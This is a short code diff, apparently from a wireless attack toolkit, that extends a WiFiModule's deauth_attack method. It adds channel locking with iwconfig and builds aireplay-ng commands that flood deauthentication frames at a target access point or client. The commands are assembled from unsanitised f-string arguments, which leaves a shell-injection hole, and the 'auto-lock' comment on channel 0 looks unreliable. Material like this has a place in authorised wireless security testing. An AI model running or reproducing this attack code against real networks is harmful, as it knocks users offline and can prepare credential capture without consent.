@@ -339,12 +339,21 @@ class WiFiModule:
     # Deauth attack (existing, now with endpoint)
     # ------------------------------------------------------------------
 
-    def deauth_attack(self, bssid, client=None, count=5):
+    def deauth_attack(self, bssid, client=None, count=5, channel=None):
         """Send deauthentication frames via aireplay-ng."""
         if not self._is_monitor_mode():
             result = self.start_monitor_mode()
             if not result['success']:
                 return {'success': False, 'error': 'Failed to enter monitor mode'}
+
+        # Lock to the correct channel (critical for deauth to work)
+        if channel:
+            self._run(f'iwconfig {self.monitor_interface} channel {channel}')
+        else:
+            # Auto-lock: listen for a beacon, then deauth
+            self._run(f'iwconfig {self.monitor_interface} channel 0')
+
+        # Try targeted deauth first if client specified, then broadcast
         if client:
             cmd = f'aireplay-ng -0 {count} -a {bssid} -c {client} {self.monitor_interface}'
         else:
